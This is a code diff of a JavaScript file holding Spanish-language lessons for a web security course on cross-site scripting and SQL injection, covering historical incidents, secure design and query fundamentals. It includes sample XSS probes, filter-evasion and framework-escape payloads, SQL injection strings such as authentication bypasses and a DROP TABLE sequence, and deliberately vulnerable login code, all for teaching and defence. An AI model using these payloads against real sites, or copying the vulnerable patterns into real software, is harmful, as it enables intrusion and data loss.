+A lo largo de los años, diversos plugins han presentado vulnerabilidades XSS almacenadas. En estos casos, los atacantes podían insertar código dentro de campos aparentemente benignos, como formularios de contacto, sistemas de comentarios o configuraciones internas. Cuando un administrador accedía al panel para moderar contenido, el código se ejecutaba dentro de su sesión, otorgando al atacante privilegios administrativos.
+</p>
+
+<p>
+El impacto sobre la integridad fue significativo. En numerosos incidentes, los atacantes modificaron publicaciones institucionales, alteraron la página principal de empresas, insertaron mensajes falsos o eliminaron contenido crítico. La confidencialidad también se vio afectada en casos donde los atacantes accedieron a paneles administrativos que contenían datos internos. La disponibilidad sufrió porque, en ocasiones, los sitios quedaban inutilizables o eran redirigidos hacia páginas externas.
+</p>
+
+<p>
+Para las organizaciones afectadas, estos incidentes representaron pérdidas económicas derivadas de interrupciones del sitio, daños reputacionales por mostrar contenido no autorizado y costos derivados de auditorías y restauraciones.
+</p>
+
+<h2>Twitter y la ejecución automática de código en interfaces de usuario</h2>
+
+<p>
+Twitter es una red social con un volumen extremadamente alto de interacción por minuto. Los usuarios publican mensajes breves, imágenes, enlaces y contenidos que pueden ser visualizados instantáneamente por millones de usuarios. Debido a su dinamismo, la plataforma debe analizar y procesar grandes cantidades de contenido en tiempo real.
+</p>
+
+<p>
+En uno de los incidentes más conocidos, se detectó que los tweets podían incluir fragmentos que, al ser interpretados por la aplicación web, ejecutaban JavaScript cuando el usuario movía el cursor sobre el texto. El problema se originó porque el sistema de sanitización no evaluaba adecuadamente ciertos caracteres Unicode que el navegador interpretaba como delimitadores de atributos.
+</p>
+
+<p>
+El impacto fue considerable. La integridad de los perfiles se vio comprometida al permitir que los atacantes publicaran mensajes no autorizados en las cuentas de otros usuarios. La confidencialidad estuvo en riesgo debido a redirecciones automáticas hacia sitios externos diseñados para capturar credenciales. La disponibilidad de la plataforma se degradó temporalmente debido a la cantidad elevada de solicitudes derivadas del comportamiento automático del script.
+</p>
+
+<p>
+Para Twitter, el incidente generó un cuestionamiento público respecto a la solidez de sus mecanismos de validación y a su capacidad para reaccionar ante vulnerabilidades que podían viralizarse de manera instantánea.
+</p>
+
+<h2>Bibliografía</h2>
+<ul>
+  <li>OWASP Foundation, Cross Site Scripting. [Online]. Available:
+    <a href="https://owasp.org/www-community/attacks/xss" target="_blank">
+      https://owasp.org/www-community/attacks/xss
+    </a>
+  </li>
+
+  <li>PortSwigger, Web Security Academy. [Online]. Available:
+    <a href="https://portswigger.net/web-security" target="_blank">
+      https://portswigger.net/web-security
+    </a>
+  </li>
+
+  <li>D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.</li>
+</ul>
       `
     },
-    'diseno-seguro-y-procesos': {
-      id: 'diseno-seguro-y-procesos',
-      title: 'Diseño seguro y ciclo de desarrollo',
-        description: 'Descubre cómo integrar medidas de seguridad contra XSS en cada etapa del desarrollo, desde el diseño hasta las revisiones de código.',
-        category: 'xss',
-        htmlContent: `
-          <h2>Introducción</h2>
-          <p>
-            La prevención de vulnerabilidades como XSS no se logra con parches puntuales, sino incorporando principios de <strong>diseño seguro</strong> a lo largo de todo el SDLC. En este módulo abordamos la seguridad —especialmente la prevención de XSS— desde la planificación, implementación, pruebas y mantenimiento.
-          </p>
-          <p>
-            Veremos prácticas como revisión de código con foco en seguridad, pruebas de penetración internas, uso de herramientas automáticas (SAST/DAST), capacitación del equipo y selección de frameworks que reduzcan la probabilidad de XSS. El objetivo es que la seguridad sea un hábito constante y no un pensamiento de último momento.
-          </p>
-
-          <h2>Incorporando seguridad desde el diseño</h2>
-          <p><strong>Security by Design</strong> implica considerar amenazas y controles en la fase de arquitectura, no después.</p>
-          <ul>
-            <li><strong>Modelado de amenazas temprano:</strong> Para cada entrada de usuario en requisitos, anota posibles amenazas (XSS, SQLi) y contramedidas (validación, escape, sanitizado). Metodologías como <em>STRIDE</em> ayudan a categorizar. Cualquier funcionalidad que muestre contenido de usuarios merece atención especial.</li>
-            <li><strong>Políticas y requisitos de seguridad:</strong> Define requisitos no funcionales: “sanitizar todo input antes de renderizar”, “implementar CSP”, “no usar <code>eval</code>”, etc.</li>
-            <li><strong>Elección de tecnologías seguras:</strong> Prefiere frameworks que auto-escapen (Django, Rails) y frontends que escapen salida por defecto (React, Angular, Vue). Evita generar HTML por concatenación de strings.</li>
-            <li><strong>Principio de mínima exposición:</strong> Si no necesitas interpretar HTML de usuarios, no lo permitas. Menos superficies interpretables = menor riesgo.</li>
-          </ul>
-          <p>Adoptar seguridad desde fases tempranas evita errores comunes que llevan a XSS y reduce costos de corrección.</p>
-
-          <h2>Buenas prácticas en la implementación (codificación segura)</h2>
-          <ul>
-            <li><strong>Nunca</strong> construyas HTML por concatenación sin sanitizar; usa plantillas seguras o APIs del DOM seguras.</li>
-            <li><strong>Centraliza escapes/sanitizado:</strong> Crea/utiliza utilidades consistentes (<code>escapeHtml()</code>, <code>escapeAttr()</code>, etc.; OWASP ESAPI es una opción multi-lenguaje).</li>
-            <li><strong>Code reviews con foco en XSS:</strong> Checklist: ¿la vista escapa datos? ¿el endpoint filtra lo que el cliente insertará en el DOM? ¿se evita <code>dangerouslySetInnerHTML</code> en React?</li>
-            <li><strong>Comentarios y documentación:</strong> Señala puntos sensibles (<code>// WARNING: input sanitizado por X</code>).</li>
-            <li><strong>Plantillas backend:</strong> No deshabilites el auto-escape salvo casos muy justificados; mejor usar sanitizadores para HTML permitido.</li>
-            <li><strong>No ignores linters/analizadores:</strong> ESLint (plugins de seguridad), SonarQube, etc. No silencies alertas sobre <code>innerHTML</code>, <code>document.write</code>, etc.</li>
-            <li><strong>Bibliotecas de terceros:</strong> Evita libs no mantenidas que toquen el DOM. Si usas WYSIWYG, revisa su sanitización y mantén versiones actualizadas.</li>
-          </ul>
-          <p>Muchas organizaciones crean <em>Guías de codificación segura</em> para estandarizar estas prácticas.</p>
-
-          <h2>Verificación y pruebas de seguridad</h2>
-          <p>No basta con creer que el código es seguro; hay que probarlo.</p>
-          <ul>
-            <li><strong>Testing manual (pentesting interno):</strong> Incluye casos maliciosos: intenta <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, <code>&lt;img onerror=alert(1) src=x&gt;</code>, <code>"&gt;&lt;svg/onload=alert(1)&gt;</code> y verifica que no se ejecuten.</li>
-            <li><strong>Herramientas DAST:</strong> OWASP ZAP, Burp Suite pueden detectar XSS reflejados/almacenados. Integra scans en pruebas.</li>
-            <li><strong>Análisis estático (SAST):</strong> Coverity, Checkmarx, SonarQube. Configura reglas para trazar de <em>sources</em> a <em>sinks</em> sin sanitizado.</li>
-            <li><strong>Ciclo de retroalimentación:</strong> Al encontrar una vulnerabilidad, corrige y analiza la causa raíz; ajusta procesos (reglas, revisiones) para evitar reincidencia.</li>
-            <li><strong>Concientización:</strong> Mantén al equipo al día sobre nuevas técnicas (p. ej., vectores DOM, Unicode tricky, XSS polimórfico).</li>
-          </ul>
-
-          <h2>Mantenimiento y despliegue seguro</h2>
-          <ul>
-            <li><strong>Parches y dependencias:</strong> Actualiza componentes susceptibles (frameworks, editores, libs DOM) ante parches XSS.</li>
-            <li><strong>Monitorización:</strong> Usa CSP con <em>report-uri/report-to</em> para recibir violaciones. Vigila logs del servidor.</li>
-            <li><strong>Plan de respuesta:</strong> Identifica vector, corrige, invalida sesiones si procede, notifica si es necesario y revisa integridad post-incidente.</li>
-            <li><strong>Bug bounty / investigación externa:</strong> Programas de recompensas pueden destapar casos límite.</li>
-            <li><strong>CI/CD seguro:</strong> Incluye SAST en cada push, pruebas de seguridad automatizadas y secciones de “impacto en seguridad” en PRs.</li>
-            <li><strong>Mejora continua:</strong> Comparte hallazgos (p. ej., DOM clobbering) y audita el código por posibles impactos.</li>
-          </ul>
-
-          <h2>Frameworks modernos y SPAs (consideraciones)</h2>
-          <ul>
-            <li><strong>Endurecer funciones peligrosas:</strong> En Angular, el binding <code>[innerHTML]</code> sanitiza por defecto; audita cualquier <code>bypassSecurityTrust*</code>. En React, evita <code>dangerouslySetInnerHTML</code> con contenido de usuarios. En Vue, usa <code>v-html</code> solo con HTML previamente sanitizado.</li>
-            <li><strong>Trusted Types:</strong> Planifica su adopción si haces mucha manipulación del DOM. Prevenirá asignaciones inseguras a <code>innerHTML</code> y similares.</li>
-            <li><strong>APIs de terceros:</strong> Prefiere SDKs oficiales, evita insertar HTML de orígenes no verificados.</li>
-          </ul>
-
-          <h2>Resumen</h2>
-          <p>
-            La seguridad —incluida la protección contra XSS— debe acompañar todo el ciclo de vida: planificar amenazas, codificar con prácticas seguras, probar con casos maliciosos, desplegar con defensas adicionales y mantener vigilancia y actualización constante.
-          </p>
-          <p>
-            Con esta mentalidad de SDLC seguro, reducimos drásticamente la probabilidad de introducir XSS. En el siguiente (y último) módulo exploraremos <strong>casos avanzados de XSS</strong> para completar el panorama defensivo.
-          </p>
-        `
-    },
-    'casos-avanzados-xss': {
-      id: 'casos-avanzados-xss',
-      title: 'Casos avanzados de XSS',
-      description: 'Analiza escenarios complejos como aplicaciones SPA, uso de terceros y editores enriquecidos, y cómo adaptar las defensas a entornos modernos.',
+    'diseño-seguro-xss': {
+      id: 'diseño-seguro-xss',
+      title: 'Diseño seguro y buenas prácticas frente a XSS',
+      description: 'Recomendaciones para el desarrollo seguro respecto a XSS.',
       category: 'xss',
       htmlContent: `
-        <h2>Introducción</h2>
-        <p>
-          A pesar de todas las protecciones vistas, los investigadores siguen encontrando formas novedosas de explotar XSS. 
-          En este módulo revisamos casos avanzados: evasión de filtros, vectores inusuales (p. ej., SVG), ataques combinados (XSS + CSRF) 
-          y aprovechamiento de debilidades en navegadores o frameworks. El objetivo es ampliar la perspectiva defensiva. 
-          <em>Nota: Este contenido es educativo; comprenderlo ayuda a defender mejor nuestras aplicaciones.</em>
-        </p>
+        <h2>El diseño seguro frente a XSS</h2>
 
-        <h2>Polimorfismo y evadiendo filtros ingenuos</h2>
-        <p>
-          Las listas negras simples (p. ej., eliminar la cadena <code>script</code>) suelen fallar. Trucos comunes:
-        </p>
-        <ul>
-          <li><strong>Mayúsculas/minúsculas:</strong> HTML no distingue caso en etiquetas; <code>&lt;ScRiPt&gt;</code> sigue siendo válido.</li>
-          <li><strong>Codificaciones alternativas:</strong> Entidades HTML (<code>&amp;lt;script&amp;gt;</code>) o hex (<code>\\x3cscript\\x3e</code>) evaden filtros literales.</li>
-          <li><strong>Cortes en múltiples entradas:</strong> Concatenar partes como <code>&lt;scr</code> + <code>ipt&gt;</code> para evadir reglas simples.</li>
-          <li><strong>Otras etiquetas ejecutables:</strong> <code>&lt;img onerror&gt;</code>, <code>&lt;iframe src="javascript:"&gt;</code>, <code>&lt;svg onload&gt;</code>, <code>&lt;math&gt;</code>, <code>&lt;body onload&gt;</code>, etc.</li>
-          <li><strong>Payloads polivalentes (polyglots):</strong> Diseñados para ejecutarse en varios contextos, p. ej. <code>"&gt;&lt;svg onload=alert(1)&gt;</code>.</li>
-        </ul>
-        <p>
-          En síntesis: confía en <strong>lista blanca</strong> y <strong>escape contextual</strong>, no en listas negras. 
-          Un caso histórico fue XSS vía <em>UTF-7</em> en IE por mala declaración de charset.
-        </p>
+<p>
+El diseño seguro frente a XSS no consiste únicamente en añadir filtros o parches cuando aparece una vulnerabilidad. Implica estructurar la aplicación desde el inicio para que los datos proporcionados por el usuario nunca se mezclen con el código que el navegador ejecuta. En esta lección se presentan pautas de diseño y fragmentos de código que ilustran buenas prácticas para reducir de forma sistemática la posibilidad de introducir XSS en aplicaciones web.
+</p>
 
-        <h2>XSS en archivos y formatos inesperados</h2>
-        <ul>
-          <li><strong>SVG:</strong> Es XML renderizable con soporte de scripts. Un SVG subido con <code>&lt;script&gt;</code> puede ejecutarse si se sirve con <code>image/svg+xml</code>. Mitiga sanitizando SVG o sirviéndolo como contenido no activo.</li>
-          <li><strong>PDF/Flash:</strong> Históricamente permitieron JS en ciertos escenarios; Flash está extinto en la web moderna, pero fue un vector.</li>
-          <li><strong>JSON mal interpretado (JSONP, MIME erróneo):</strong> Respuestas tratadas como script (p. ej., <code>&lt;script src="...callback=&lt;payload&gt;"&gt;</code>) pueden llevar a XSS. Usa MIME correcto y evita JSONP.</li>
-          <li><strong>XSS persistente de segundo orden:</strong> El payload se ejecuta después en otro flujo (p. ej., en un reporte HTML de un admin). Sanitiza consistentemente todos los usos de datos almacenados.</li>
-        </ul>
+<p>
+Cada ejemplo muestra no solo el código, sino también qué sucede en él, qué representan sus etiquetas y por qué contribuye a un diseño más seguro.
+</p>
 
-        <h2>Ataques combinados con XSS</h2>
-        <ul>
-          <li><strong>XSS + CSRF:</strong> Con XSS, el atacante puede enviar peticiones en nombre de la víctima (<code>fetch('/api/deleteAccount')</code>). Tokens CSRF siguen añadiendo fricción, aunque XSS suele poder leerlos salvo cookies <code>HttpOnly</code>.</li>
-          <li><strong>Ransomware/ataques locales:</strong> Demostraciones académicas han ido más allá del navegador (p. ej., Rowhammer vía JS); escenarios raros pero ilustrativos.</li>
-          <li><strong>Robo masivo de datos/XS-Leaks:</strong> XSS puede facilitar reconocimiento interno, exfiltración y técnicas colaterales.</li>
-          <li><strong>Auto-propagación (worms):</strong> XSS almacenado que se replica (caso Samy en MySpace). En apps colaborativas modernas, el riesgo persiste.</li>
-        </ul>
+<h3>Separación estricta entre datos y presentación</h3>
 
-        <h2>XSS en entornos modernos (SPA, SSR, etc.)</h2>
-        <ul>
-          <li><strong>SPA:</strong> React/Angular/Vue escapan por defecto, pero han existido escapes (p. ej., antiguas técnicas en AngularJS 1.x como <code>{{constructor.constructor('alert(1)')()}}</code> si se imprimían expresiones de usuario sin control).</li>
-          <li><strong>SSR + hidratación:</strong> Si el HTML inicial incluye atributos <code>on*</code> inyectados por falta de escape en SSR, la hidratación puede asumir legitimidad y no re-sanitizar.</li>
-          <li><strong>Cadena de suministro:</strong> Dependencias comprometidas (NPM/PyPI) pueden introducir XSS o robo de datos. Audita, fija versiones y minimiza confianza ciega.</li>
-        </ul>
+<p>
+Una regla fundamental consiste en tratar todos los datos provenientes de usuarios como texto y no como fragmentos de HTML. Para ello, es preferible usar mecanismos que escapen o codifiquen automáticamente la salida, en lugar de construir cadenas HTML a mano.
+</p>
 
-        <h2>Ejemplo ilustrativo avanzado: ataque usando &lt;base&gt;</h2>
-        <p>
-          La etiqueta <code>&lt;base href&gt;</code> define la URL base de recursos relativos. Inyectarla en <code>&lt;head&gt;</code> puede redirigir cargas de scripts/estilos a dominios del atacante, facilitando XSS en ciertas condiciones. 
-          Es difícil inyectar en <code>&lt;head&gt;</code>, pero ejemplifica la creatividad de los vectores.
-        </p>
+<p>
+En una plantilla del lado del servidor, un ejemplo seguro sería:
+</p>
 
-        <h2>Lecciones aprendidas de casos avanzados</h2>
-        <ul>
-          <li>No subestimar a los atacantes: apuntan a los resquicios.</li>
-          <li>XSS aparece en lugares no obvios (archivos, transformaciones intermedias, componentes externos).</li>
-          <li>Aprendizaje continuo: la seguridad evoluciona; lo raro hoy puede ser común mañana.</li>
-          <li>Defensa en profundidad: múltiples capas (escape, sanitización, CSP, cookies <code>HttpOnly</code>, etc.) limitan el impacto si una falla.</li>
-        </ul>
+<pre><code>&lt;p&gt;Bienvenido, {{ usuario.nombre }}&lt;/p&gt;
+</code></pre>
 
-        <h2>Resumen</h2>
-        <p>
-          Exploramos las fronteras de XSS: evasión de filtros, contextos no habituales y combinaciones con otras vulnerabilidades. 
-          Vimos <strong>SVG malicioso</strong>, <strong>second-order XSS</strong>, <strong>worms</strong> y debilidades históricas en frameworks. 
-          La conclusión: implementar todas las precauciones y mantenerse actualizado.
-        </p>
-        <p>
-          La seguridad es un proceso continuo. Con buenas prácticas de codificación, políticas sólidas, un SDLC con foco en seguridad y vigilancia constante, 
-          estaremos mejor equipados para defender nuestras aplicaciones ante amenazas conocidas y emergentes.
-        </p>
+<p>
+En muchos motores de plantillas (por ejemplo, Handlebars, Twig o similares), las llaves dobles indican que el valor será escapado antes de insertarse. Si el usuario intenta registrar un nombre como:
+</p>
 
-        <h2>Resumen final del curso</h2>
-        <p>
-          A lo largo de estos módulos cubrimos fundamentos de XSS, tipos principales, importancia del contexto al escapar, DOM XSS, 
-          prevención integral, el papel de CSP y cabeceras, integración de seguridad en el ciclo de desarrollo y, finalmente, casos avanzados. 
-          Con este conocimiento podrás diseñar y desarrollar aplicaciones robustas, evitar errores comunes y responder a desafíos de seguridad con enfoque ético y didáctico.
-        </p>
+<pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;
+</code></pre>
+
+<p>
+la plantilla lo convertirá en texto literal, mostrando en pantalla los caracteres menores y mayores, en lugar de interpretar el contenido como etiqueta de script. La etiqueta p mantiene su función de párrafo y el motor de plantillas se encarga de que dentro de ella solo haya texto, no código ejecutable.
+</p>
+
+<p>
+En contraste, concatenar manualmente HTML con datos del usuario:
+</p>
+
+<pre><code>const html = "&lt;p&gt;Bienvenido, " + usuario.nombre + "&lt;/p&gt;";
+</code></pre>
+
+<p>
+obliga al desarrollador a recordar escapar el valor por su cuenta y facilita errores de diseño. El enfoque basado en plantillas que escapan por defecto reduce este riesgo de forma considerable.
+</p>
+
+<h3>Construcción segura del DOM en el lado del cliente</h3>
+
+<p>
+En el navegador, muchas vulnerabilidades XSS surgen por el uso de innerHTML con cadenas que incluyen datos del usuario. Una alternativa segura es construir el DOM mediante nodos y asignar texto usando textContent.
+</p>
+
+<p>Un ejemplo de construcción segura de un comentario sería:</p>
+
+<pre><code>function agregarComentario(contenedor, textoComentario, autor) {
+  const tarjeta = document.createElement('article');
+  tarjeta.className = 'comentario';
+
+  const encabezado = document.createElement('h3');
+  encabezado.textContent = autor;
+
+  const cuerpo = document.createElement('p');
+  cuerpo.textContent = textoComentario;
+
+  tarjeta.appendChild(encabezado);
+  tarjeta.appendChild(cuerpo);
+  contenedor.appendChild(tarjeta);
+}
+</code></pre>
+
+<p>
+En este código, la etiqueta <code>article</code> agrupa el comentario completo, <code>h3</code> contiene el nombre del autor y <code>p</code> almacena el texto del comentario. En ningún momento se utiliza <code>innerHTML</code>, por lo que el navegador nunca interpreta partes del texto como HTML. Incluso si el usuario introduce secuencias que parecen etiquetas, estas se mostrarán literalmente y no se ejecutarán.
+</p>
+
+<p>
+Este diseño evita que el desarrollador tenga que revisar cada campo para escapar manualmente los caracteres especiales. El uso sistemático de <code>textContent</code> para todo dato no confiable es una buena práctica poderosa frente a XSS.
+</p>
+
+<h3>Formularios y salida controlada en el servidor</h3>
+
+<p>
+Los formularios son una fuente común de datos que después se muestran en la interfaz. Diseñar el flujo para que el servidor siempre procese y escape la salida antes de devolverla al usuario es una práctica esencial.
+</p>
+
+<p>En un controlador de un backend <code>Express</code> se podría tener:</p>
+
+<pre><code>app.post('/comentarios', (req, res) =&gt; {
+  const comentario = req.body.comentario;
+  const autor = req.body.autor;
+
+  // Se guarda el texto tal cual en la base de datos, sin interpretarlo como HTML
+  guardarComentario({ comentario, autor });
+
+  res.redirect('/comentarios');
+});
+</code></pre>
+
+<p>
+Y en la plantilla donde se muestran los comentarios:
+</p>
+
+<pre><code>&lt;ul&gt;
+  {{#each comentarios}}
+    &lt;li&gt;
+      &lt;strong&gt;{{ this.autor }}&lt;/strong&gt;:
+      &lt;span&gt;{{ this.comentario }}&lt;/span&gt;
+    &lt;/li&gt;
+  {{/each}}
+&lt;/ul&gt;
+</code></pre>
+
+<p>
+Las etiquetas <code>ul</code> y <code>li</code> estructuran la lista de comentarios, <code>strong</code> resalta el nombre del autor y <code>span</code> contiene el texto del comentario. El motor de plantillas se encarga de escapar <code>autor</code> y <code>comentario</code>. El diseño del flujo garantiza que los datos siempre pasan por una capa de presentación que aplica codificación adecuada.
+</p>
+
+<h3>Eliminación de código embebido en atributos HTML</h3>
+
+<p>
+Otra buena práctica de diseño es evitar código JavaScript embebido directamente en atributos HTML como <code>onclick</code> u <code>onmouseover</code>. En lugar de ello, se deben definir manejadores de eventos desde JavaScript, separando claramente el marcado de la lógica.
+</p>
+
+<pre><code>&lt;button id="enviar-comentario"&gt;Enviar comentario&lt;/button&gt;
+</code></pre>
+<p>Y en el script asociado:</p>
+<pre><code>const boton = document.getElementById('enviar-comentario');
+
+boton.addEventListener('click', function () {
+  enviarFormularioComentario();
+});
+</code></pre>
+
+<p>
+En este enfoque, la etiqueta <code>button</code> solo describe el elemento visual. No contiene código JavaScript en su definición. Si se insertaran datos de usuario en otros atributos del botón, estos no afectarían al comportamiento del manejador de eventos, que está definido del lado del código y no en el HTML generado. Al reducir el uso de atributos con código, se eliminan puntos comunes de inyección.
+</p>
+
+<h3>Diseño de componentes que nunca renderizan HTML crudo</h3>
+
+<p>
+En aplicaciones basadas en componentes, como las escritas con frameworks modernos, es recomendable definir una política clara: ningún componente debe usar directivas que permitan interpretar HTML crudo a partir de datos del usuario, salvo casos muy justificados y con sanitización explícita.
+</p>
+
+<p>En una plantilla de componente, una versión segura sería:</p>
+
+<pre><code>&lt;div class="tarjeta-usuario"&gt;
+  &lt;h2&gt;{{ nombre }}&lt;/h2&gt;
+  &lt;p&gt;{{ descripcion }}&lt;/p&gt;
+&lt;/div&gt;
+</code></pre>
+
+<p>La etiqueta <code>div</code> agrupa la tarjeta, <code>h2</code> contiene el nombre y <code>p</code> la descripción. La lógica del componente se limita a proporcionar valores de texto:</p>
+
+<pre><code>@Component({
+  selector: 'app-tarjeta-usuario',
+  templateUrl: './tarjeta-usuario.html'
+})
+export class TarjetaUsuarioComponent {
+  nombre = '';
+  descripcion = '';
+}
+</code></pre>
+
+<p>
+Mientras las propiedades <code>nombre</code> y <code>descripcion</code> se vinculen con interpolación simple, el framework aplicará escape automático. La directiva que permitiría interpretar HTML crudo (por ejemplo, propiedades especiales que insertan HTML sin escape) no debe usarse con datos de usuario. Establecer esta regla de diseño desde el inicio evita que, por comodidad, se introduzcan atajos peligrosos.
+</p>
+
+<h3>Uso de funciones reutilizables para validar y normalizar entradas</h3>
+
+<p>
+Un diseño seguro contempla funciones reutilizables que validan y normalizan entradas en lugar de repetir lógica dispersa por el código. Esto reduce errores y ofrece un comportamiento coherente en toda la aplicación.
+</p>
+
+<p>Un ejemplo de función de normalización para nombres podría ser:</p>
+
+<pre><code>function normalizarNombre(nombre) {
+  const recortado = nombre.trim();
+  const limitado = recortado.slice(0, 80);
+  return limitado;
+}
+</code></pre>
+
+<p>Y su uso en el backend:</p>
+
+<pre><code>app.post('/perfil', (req, res) =&gt; {
+  const nombreBruto = req.body.nombre;
+  const nombre = normalizarNombre(nombreBruto);
+
+  actualizarPerfil(req.usuario.id, { nombre });
+  res.redirect('/perfil');
+});
+</code></pre>
+
+<p>
+En este diseño, la entrada se limpia y se limita de forma consistente. Aunque la normalización por sí sola no elimina por completo el riesgo de XSS, combinada con la codificación de salida y el uso de plantillas seguras, contribuye a un modelo de datos más predecible y menos propenso a contener caracteres problemáticos.
+</p>
+
+<h3>Configuración centralizada de políticas de seguridad</h3>
+
+<p>
+Además del código de aplicación, un diseño seguro incorpora políticas a nivel de servidor que establecen límites a la ejecución de scripts. Content Security Policy es un ejemplo de configuración que se debe contemplar desde las primeras fases del diseño.
+</p>
+<p>Un encabezado básico podría definirse en la configuración del servidor:</p>
+<pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
+</code></pre>
+
+<p>
+En este caso, <code>default-src</code> establece que los recursos deben provenir del mismo origen, <code>script-src</code> limita los scripts a los alojados en el propio dominio y <code>object-src</code> evita la carga de objetos potencialmente peligrosos. Si el código de la aplicación respetó las buenas prácticas anteriores, esta política no debería interferir con el funcionamiento normal, pero sí bloquearía intentos de ejecutar scripts insertados por datos no autorizados.
+</p>
+
+<p>
+Integrar estas cabeceras desde el diseño inicial reduce la probabilidad de que se despliegue la aplicación sin defensas de navegador, y obliga a revisar conscientemente qué orígenes y tipos de recurso son realmente necesarios.
+</p>
+
+<h3>Bibliografía</h3>
+<ul>
+  <li>
+    OWASP Foundation, XSS Prevention Cheat Sheet, [Online]. Available:
+    <a href="https://owasp.org/www-community/xss-prevention" target="_blank">
+      https://owasp.org/www-community/xss-prevention
+    </a>
+  </li>
+
+  <li>
+    OWASP Foundation, Cheat Sheet Series: DOM based XSS Prevention, [Online]. Available:
+    <a href="https://cheatsheetseries.owasp.org" target="_blank">
+      https://cheatsheetseries.owasp.org
+    </a>
+  </li>
+
+  <li>
+    Mozilla Developer Network, Web Security Concepts, [Online]. Available:
+    <a href="https://developer.mozilla.org/en-US/docs/Web/Security" target="_blank">
+      https://developer.mozilla.org/en-US/docs/Web/Security
+    </a>
+  </li>
+
+  <li>
+    Google, Web Fundamentals: Security, [Online]. Available:
+    <a href="https://developers.google.com/web/fundamentals/security" target="_blank">
+      https://developers.google.com/web/fundamentals/security
+    </a>
+  </li>
+
+  <li>
+    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Indianapolis, IN, USA: Wiley Publishing, 2011.
+  </li>
+</ul>
       `
     },
+
+    //Sección de inyección SQL
     'fundamentos-sqli': {
       id: 'fundamentos-sqli',
-      title: 'Fundamentos de inyección SQL',
-      description: 'Aprende qué es la inyección SQL, cómo un dato no confiable puede alterar una consulta y qué impactos puede tener sobre la confidencialidad e integridad de la base de datos.',
+      title: 'Fundamentos de Inyección SQL',
+      description: '¿Qué es la Inyección SQL y cómo amenaza la seguridad?',
       category: 'sqli',
       htmlContent: `
-        <h2>Introducción</h2>
         <p>
-          La inyección SQL es una vulnerabilidad que permite introducir comandos SQL maliciosos a través de una aplicación, alterando la consulta que ejecuta la base de datos.
-          Sucede cuando datos de usuario se insertan en sentencias SQL sin validación o separación adecuada entre <em>código</em> y <em>datos</em>.
-        </p>
-        <p>
-          En este módulo revisamos qué es una consulta SQL, cómo las aplicaciones la construyen y qué pasa cuando un atacante logra manipularla.
-          Estas bases preparan el terreno para módulos posteriores.
-        </p>
+La mayoría de las aplicaciones web modernas dependen de bases de datos relacionales para almacenar y consultar información. Lenguajes como SQL se utilizan para definir tablas, insertar registros, actualizar datos y ejecutar consultas que recuperan información. Desde el punto de vista de la aplicación, una operación típica consiste en recibir datos desde un formulario o desde la URL, construir una consulta SQL y enviarla al motor de base de datos para que la ejecute.
+</p>
 
-        <h2>Explicación</h2>
-        <p>Ejemplo de consulta legítima:</p>
-        <pre><code class="language-sql">SELECT *
-    FROM products
-    WHERE category = 'Garden' AND released = 1;</code></pre>
+<p>
+Cuando este proceso se diseña de manera incorrecta, los datos proporcionados por el usuario no se tratan como simples valores, sino como parte del propio lenguaje SQL. Esto abre la puerta a la inyección SQL, una de las vulnerabilidades más antiguas y críticas en el desarrollo web.
+</p>
 
-        <p>Construcción insegura en Java (concatenación directa de entrada):</p>
-        <pre><code class="language-java">String category = request.getParameter("category");
-    String query = "SELECT * FROM products WHERE category = '" + category + "' AND released = 1";
-    Statement stmt = connection.createStatement();
-    ResultSet results = stmt.executeQuery(query);</code></pre>
+<h3>¿Qué es la inyección SQL?</h3>
 
-        <p>Un atacante podría invocar:</p>
-        <pre><code class="language-text">https://sitio-inseguro.com/products?category=Garden'--</code></pre>
+<p>
+La inyección SQL es una vulnerabilidad que se produce cuando una aplicación incluye datos proporcionados por el usuario dentro de una consulta SQL sin validarlos ni parametrizarlos adecuadamente. En lugar de ser tratados como texto literal, esos datos se interpretan como instrucciones adicionales para el motor de base de datos. El atacante aprovecha esta situación para alterar el significado original de la consulta y conseguir que la base de datos ejecute acciones no previstas por el desarrollador.
+</p>
 
-        <p>Consulta resultante:</p>
-        <pre><code class="language-sql">SELECT * FROM products WHERE category = 'Garden'--' AND released = 1;</code></pre>
+<p>
+En términos simples, la aplicación confía demasiado en lo que recibe del usuario. En lugar de construir una consulta fija, con huecos claramente delimitados para los valores, concatena fragmentos de texto donde el usuario puede introducir comillas, operadores lógicos o palabras clave del lenguaje SQL. El resultado es que la base de datos no puede distinguir entre la consulta legítima y el código insertado por el atacante.
+</p>
 
-        <p>
-          El <code>--</code> inicia un comentario, truncando la parte restante y modificando la lógica.
-          En escenarios sensibles (autenticación, datos privados) el impacto es crítico.
-        </p>
+<h3>Construcción de una consulta vulnerable</h3>
 
-        <div class="warning-box">
-          <p><strong>Idea clave:</strong> La base de datos no sabe qué parte del string es código o datos; ejecuta todo. El atacante cierra comillas o añade cláusulas (<code>' OR '1'='1</code>, <code>; DROP TABLE ...; --</code>) para cambiar la consulta.</p>
-        </div>
+<p>
+Un patrón muy común de vulnerabilidad aparece cuando el desarrollador construye la consulta concatenando cadenas. Suponga un formulario de inicio de sesión con campos <code>usuario</code> y <code>contrasena</code>. Un pseudocódigo inseguro podría verse así:
+</p>
 
-        <h2>Impacto</h2>
-        <ul>
-          <li>Lectura de datos sensibles (de otros usuarios o del sistema).</li>
-          <li>Modificación o borrado de registros; escalamiento de privilegios.</li>
-          <li>Compromiso del servidor de BD o incluso del SO en entornos mal configurados.</li>
-          <li>Incidentes de alto perfil han expuesto millones de registros debido a SQLi.</li>
-        </ul>
+<pre><code class="language-html highlight-vulnerable">const usuario = req.body.usuario;
+const contrasena = req.body.contrasena;
 
-        <h2>Ejemplos vulnerables</h2>
-        <h3>Ejemplo 1 – Autenticación vulnerable (PHP)</h3>
-        <pre><code class="language-php">$username = $_POST['user'];
-    $password = $_POST['pass'];
-    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
-    $result = mysqli_query($conn, $query);</code></pre>
-        <p>
-          Usuario: <code>admin'--</code> &rarr; La contraseña queda comentada y podría otorgar acceso no autorizado.
-        </p>
+const consulta = "SELECT * FROM usuarios " +
+                 "WHERE usuario = '" + usuario + "' " +
+                 "AND contrasena = '" + contrasena + "'";
 
-        <h3>Ejemplo 2 – Búsqueda vulnerable (JavaScript/NoSQL)</h3>
